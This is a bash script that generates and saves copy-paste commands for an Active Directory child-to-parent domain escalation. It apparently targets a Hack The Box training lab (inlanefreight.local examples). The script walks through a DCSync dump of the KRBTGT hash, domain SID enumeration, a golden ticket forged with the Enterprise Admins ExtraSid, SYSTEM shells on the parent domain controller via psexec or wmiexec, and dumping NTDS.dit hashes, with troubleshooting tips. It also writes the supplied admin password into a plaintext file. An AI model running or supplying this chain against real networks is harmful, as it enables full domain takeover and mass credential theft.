#!/bin/bash
# Corrected version of x.sh - Active Directory Attack Command Generator
# Fixed: Proper handling of Enterprise Admins SID (-519 RID)

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

generate_attack_commands() {
    # Load configuration from Phase 1
    if [[ ! -f "ad_target.conf" ]]; then
        echo -e "${RED}[!] Error: ad_target.conf not found. Run Phase 1 discovery first.${NC}"
        return 1
    fi

    echo -e "\n${BLUE}=== Generating Attack Commands ===${NC}\n"

    # Source the configuration
    source ad_target.conf

    # Ask for credentials if not in config
    if [[ -z "$CHILD_USER" ]] || [[ -z "$CHILD_PASS" ]]; then
        echo -e "${YELLOW}[?] Enter child domain admin credentials:${NC}"
        read -p "Username (e.g., htb-student_adm): " CHILD_USER
        read -sp "Password: " CHILD_PASS
        echo ""
    fi

    # Ask for parent DC info if not discovered
    if [[ -z "$PARENT_DC_IP" ]] || [[ -z "$PARENT_DC_NAME" ]]; then
        echo -e "${YELLOW}[?] Enter parent domain information:${NC}"
        read -p "Parent DC IP (e.g., 172.16.5.5): " PARENT_DC_IP
        read -p "Parent DC Hostname (e.g., academy-ea-dc01.inlanefreight.local): " PARENT_DC_NAME
    fi

    # Extract domain components
    DOMAIN_SHORT_UPPER=$(echo "$DOMAIN_SHORT" | tr '[:lower:]' '[:upper:]')
    DOMAIN_FQDN_UPPER=$(echo "$DOMAIN" | tr '[:lower:]' '[:upper:]')

    echo -e "${GREEN}[+] Using configuration:${NC}"
    echo "  Child Domain: $DOMAIN"
    echo "  Child DC IP: $DC_IP"
    echo "  Child DC Name: $DC_NAME"
    echo "  Parent DC IP: $PARENT_DC_IP"
    echo "  Parent DC Name: $PARENT_DC_NAME"
    echo "  Domain Short: $DOMAIN_SHORT_UPPER"

    echo -e "\n${CYAN}---------------------------------------------------------------------${NC}"
    echo -e "${YELLOW}GENERATED COMMANDS (copy and paste):${NC}"
    echo -e "${CYAN}---------------------------------------------------------------------${NC}\n"

    # 1. DCSync for KRBTGT hash
    echo -e "${GREEN}# 1. Perform DCSync to retrieve KRBTGT NT hash from child domain${NC}"
    echo -e "${CYAN}secretsdump.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${DC_IP}' -just-dc-user ${DOMAIN_SHORT_UPPER}/krbtgt${NC}"
    echo ""

    # 2. Enumerate Child Domain SID
    echo -e "${GREEN}# 2. Enumerate Domain SID of child domain via SID brute-forcing${NC}"
    echo -e "${CYAN}lookupsid.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${DC_IP}'${NC}"
    echo ""

    # 3. Extract only child domain SID
    echo -e "${GREEN}# 3. Extract only the child domain SID (filter output)${NC}"
    echo -e "${CYAN}lookupsid.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${DC_IP}' | grep \"Domain SID\"${NC}"
    echo ""

    # 4. Enumerate parent domain for Enterprise Admins SID
    echo -e "${GREEN}# 4. Get parent domain SID (you will append -519 for Enterprise Admins)${NC}"
    echo -e "${CYAN}lookupsid.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${PARENT_DC_IP}' | grep \"Domain SID\"${NC}"
    echo ""

    # 5. Forge Golden Ticket with ExtraSids - CORRECTED
    echo -e "${GREEN}# 5. Forge a Golden Ticket with ExtraSids using ticketer.py${NC}"
    echo -e "${CYAN}# CRITICAL: You must append -519 to the parent domain SID from command #4"
    echo -e "# Example: If command #4 shows: S-1-5-21-3842939050-3880317879-2865463114"
    echo -e "#          Then -extra-sid is:  S-1-5-21-3842939050-3880317879-2865463114-519"
    echo -e "#"
    echo -e "# Fill in the values from commands above:${NC}"
    echo "ticketer.py -nthash <KRBTGT_HASH_FROM_CMD1> \\"
    echo "            -domain $DOMAIN_FQDN_UPPER \\"
    echo "            -domain-sid <CHILD_SID_FROM_CMD3> \\"
    echo "            -extra-sid <PARENT_SID_FROM_CMD4>-519 \\"
    echo "            hacker"
    echo ""

    # 6. Set KRB5CCNAME environment variable
    echo -e "${GREEN}# 6. Set KRB5CCNAME to use forged ticket for Kerberos auth${NC}"
    echo -e "${CYAN}export KRB5CCNAME=\$(pwd)/hacker.ccache${NC}"
    echo ""

    # 7. Verify ticket
    echo -e "${GREEN}# 7. Verify the ticket was created (optional)${NC}"
    echo -e "${CYAN}klist${NC}"
    echo ""

    # 8. Use psexec.py with Kerberos to gain SYSTEM shell on parent DC
    echo -e "${GREEN}# 8. Use psexec.py with Kerberos to gain SYSTEM shell on parent DC${NC}"
    echo -e "${CYAN}psexec.py hacker@$PARENT_DC_NAME -k -no-pass -target-ip $PARENT_DC_IP${NC}"
    echo ""

    # 9. Alternative: wmiexec
    echo -e "${GREEN}# 9. (Alternative) Use wmiexec.py if psexec fails${NC}"
    echo -e "${CYAN}wmiexec.py hacker@$PARENT_DC_NAME -k -no-pass${NC}"
    echo ""

    # 10. Alternative: secretsdump
    echo -e "${GREEN}# 10. (Alternative) Use secretsdump to dump parent domain hashes${NC}"
    echo -e "${CYAN}secretsdump.py hacker@$PARENT_DC_NAME -k -no-pass -target-ip $PARENT_DC_IP${NC}"
    echo ""

    # 11. Fully automated escalation using raiseChild.py
    echo -e "${GREEN}# 11. (Fully Automated) Use raiseChild.py for automatic escalation${NC}"
    echo -e "${CYAN}raiseChild.py -target-exec $PARENT_DC_IP '${DOMAIN_FQDN_UPPER}/${CHILD_USER}:${CHILD_PASS}'${NC}"

    echo -e "\n${CYAN}---------------------------------------------------------------------${NC}"

    # Create timestamp for filename
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    OUTPUT_FILE="attack_commands_${TIMESTAMP}.txt"

    # Save commands to file - CORRECTED VERSION
    cat > "$OUTPUT_FILE" << 'EOFMARKER'
# ============================================================================
# Active Directory Child-to-Parent Domain Escalation Attack Commands
# ============================================================================
# Generated: $(date)
# Child Domain: $DOMAIN
# Child DC: $DC_IP ($DC_NAME)
# Parent DC: $PARENT_DC_IP ($PARENT_DC_NAME)
# ============================================================================

# ----------------------------------------------------------------------------
# STEP 1: Extract KRBTGT Hash from Child Domain (DCSync Attack)
# ----------------------------------------------------------------------------
secretsdump.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${DC_IP}' -just-dc-user ${DOMAIN_SHORT_UPPER}/krbtgt

# Expected output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NT_HASH>:::
# Save the <KRBTGT_NT_HASH> for use in Step 5


# ----------------------------------------------------------------------------
# STEP 2: Enumerate Child Domain SID
# ----------------------------------------------------------------------------
lookupsid.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${DC_IP}'

# This will list all SIDs in the child domain


# ----------------------------------------------------------------------------
# STEP 3: Extract Child Domain SID (Base SID only)
# ----------------------------------------------------------------------------
lookupsid.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${DC_IP}' | grep "Domain SID"

# Expected output:
# [*] Domain SID is: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
# Save this SID (without any RID) for use in Step 5


# ----------------------------------------------------------------------------
# STEP 4: Enumerate Parent Domain SID
# ----------------------------------------------------------------------------
lookupsid.py '${DOMAIN}/${CHILD_USER}:${CHILD_PASS}@${PARENT_DC_IP}' | grep "Domain SID"

# Expected output:
# [*] Domain SID is: S-1-5-21-YYYYYYYYYY-YYYYYYYYYY-YYYYYYYYYY
# Save this base SID (you will append -519 in Step 5)


# ----------------------------------------------------------------------------
# STEP 5: Forge Golden Ticket with Enterprise Admins SID (SID Injection)
# ----------------------------------------------------------------------------
# CRITICAL: Replace placeholders with actual values from steps above
# CRITICAL: The -extra-sid MUST have -519 appended (Enterprise Admins RID)
#
# Fill in these values:
#   <KRBTGT_HASH>    = KRBTGT NT hash from Step 1
#   <CHILD_SID>      = Child domain SID from Step 3
#   <PARENT_SID>-519 = Parent domain SID from Step 4 + "-519"
#
# Example values (DO NOT USE THESE - use your actual values):
#   -nthash 9d765b482771505cbe97411065964d5f
#   -domain-sid S-1-5-21-2806153819-209893948-922872689
#   -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519

ticketer.py -nthash <KRBTGT_HASH> \
            -domain $DOMAIN_FQDN_UPPER \
            -domain-sid <CHILD_SID> \
            -extra-sid <PARENT_SID>-519 \
            hacker

# This creates: hacker.ccache


# ----------------------------------------------------------------------------
# STEP 6: Export Kerberos Ticket Cache
# ----------------------------------------------------------------------------
export KRB5CCNAME=$(pwd)/hacker.ccache


# ----------------------------------------------------------------------------
# STEP 7: Verify Ticket (Optional but Recommended)
# ----------------------------------------------------------------------------
klist
klist -e

# Verify that:
# 1. Ticket is present
# 2. Principal is hacker@LOGISTICS.INLANEFREIGHT.LOCAL
# 3. Server is krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL@LOGISTICS.INLANEFREIGHT.LOCAL


# ----------------------------------------------------------------------------
# STEP 8: Gain Access to Parent Domain Controller (Method 1: psexec)
# ----------------------------------------------------------------------------
psexec.py hacker@$PARENT_DC_NAME -k -no-pass -target-ip $PARENT_DC_IP

# If successful, you will get a SYSTEM shell on the parent DC


# ----------------------------------------------------------------------------
# STEP 9: Alternative Access Method (wmiexec)
# ----------------------------------------------------------------------------
# Use this if psexec fails due to share write issues
wmiexec.py hacker@$PARENT_DC_NAME -k -no-pass

# Advantages: Doesn't require writable shares


# ----------------------------------------------------------------------------
# STEP 10: Alternative Access Method (secretsdump)
# ----------------------------------------------------------------------------
# Use this to dump all credentials without getting a shell
secretsdump.py hacker@$PARENT_DC_NAME -k -no-pass -target-ip $PARENT_DC_IP

# This dumps NTDS.dit including all domain admin hashes


# ----------------------------------------------------------------------------
# STEP 11: Fully Automated Method (raiseChild.py)
# ----------------------------------------------------------------------------
# Use this to automate the entire attack chain
raiseChild.py -target-exec $PARENT_DC_IP '${DOMAIN_FQDN_UPPER}/${CHILD_USER}:${CHILD_PASS}'

# This tool automatically:
# 1. Performs DCSync on child domain
# 2. Extracts SIDs
# 3. Forges golden ticket
# 4. Gains access to parent DC


# ============================================================================
# TROUBLESHOOTING
# ============================================================================
#
# Issue: "share 'ADMIN$' is not writable" with psexec
# Solution: The -extra-sid is missing -519. Reforge ticket with correct SID.
#           Use wmiexec or secretsdump instead.
#
# Issue: "KDC_ERR_TGT_REVOKED"
# Solution: Ticket is invalid. Check that all SIDs are correct.
#
# Issue: "KRB_AP_ERR_MODIFIED"
# Solution: Time skew or incorrect encryption. Check system time.
#
# Issue: "No credentials cache found"
# Solution: Run: export KRB5CCNAME=$(pwd)/hacker.ccache
#
# ============================================================================
# NOTES
# ============================================================================
#
# 1. Enterprise Admins RID is ALWAYS 519
# 2. Commands 1-4 use single quotes to escape special characters in password
# 3. Command 8 uses 'hacker' without domain prefix (golden ticket format)
# 4. The golden ticket grants Enterprise Admin privileges on parent domain
# 5. This attack works because child domain trusts are bidirectional by default
#
# ============================================================================
EOFMARKER

    # Replace variables in the saved file
    sed -i "s|\$(date)|$(date)|g" "$OUTPUT_FILE"
    sed -i "s|\${DOMAIN}|${DOMAIN}|g" "$OUTPUT_FILE"
    sed -i "s|\${CHILD_USER}|${CHILD_USER}|g" "$OUTPUT_FILE"
    sed -i "s|\${CHILD_PASS}|${CHILD_PASS}|g" "$OUTPUT_FILE"
    sed -i "s|\${DC_IP}|${DC_IP}|g" "$OUTPUT_FILE"
    sed -i "s|\${DC_NAME}|${DC_NAME}|g" "$OUTPUT_FILE"
    sed -i "s|\${PARENT_DC_IP}|${PARENT_DC_IP}|g" "$OUTPUT_FILE"
    sed -i "s|\${PARENT_DC_NAME}|${PARENT_DC_NAME}|g" "$OUTPUT_FILE"
    sed -i "s|\${DOMAIN_SHORT_UPPER}|${DOMAIN_SHORT_UPPER}|g" "$OUTPUT_FILE"
    sed -i "s|\${DOMAIN_FQDN_UPPER}|${DOMAIN_FQDN_UPPER}|g" "$OUTPUT_FILE"

    echo -e "${GREEN}[+] Commands saved to: ${YELLOW}$OUTPUT_FILE${NC}"
    echo -e "\n${YELLOW}[!] CRITICAL REMINDERS:${NC}"
    echo -e "  ${RED}•${NC} ${YELLOW}The -extra-sid parameter MUST end with -519 (Enterprise Admins RID)${NC}"
    echo -e "  ${RED}•${NC} ${YELLOW}Example: S-1-5-21-3842939050-3880317879-2865463114-519${NC}"
    echo -e "  ${RED}•${NC} ${YELLOW}If psexec fails with 'not writable', use wmiexec or secretsdump instead${NC}"
    echo -e "  ${RED}•${NC} ${YELLOW}Always verify ticket with 'klist' after creating it${NC}"
    echo -e "  ${RED}•${NC} ${YELLOW}After creating golden ticket, run: export KRB5CCNAME=\$(pwd)/hacker.ccache${NC}"
}

# Main script logic
show_banner() {
    cat << "EOF"
    ____  __                       ___          ____  _
   / __ \/ /_  ____ _________     <  /         / __ \(_)_____________ _   _____  _______  __
  / /_/ / __ \/ __ `/ ___/ _ \    / /         / / / / / ___/ ___/ __ \ | / / _ \/ ___/ / / /
 / ____/ / / / /_/ (__  )  __/   / /         / /_/ / (__  ) /__/ /_/ / |/ /  __/ /  / /_/ /
/_/   /_/ /_/\__,_/____/\___/   /_/ ________/_____/_/____/\___/\____/|___/\___/_/   \__, /
                                    /_____/                                         /____/

Active Directory Attack Command Generator
EOF
}

show_banner

# Check if --generate flag is provided
if [[ "$1" != "--generate" ]]; then
    echo ""
    echo -e "${YELLOW}[?] Run this script with --generate to create attack commands${NC}"
    echo "Usage: $0 --generate"
    exit 0
fi

# Call the function
generate_attack_commands
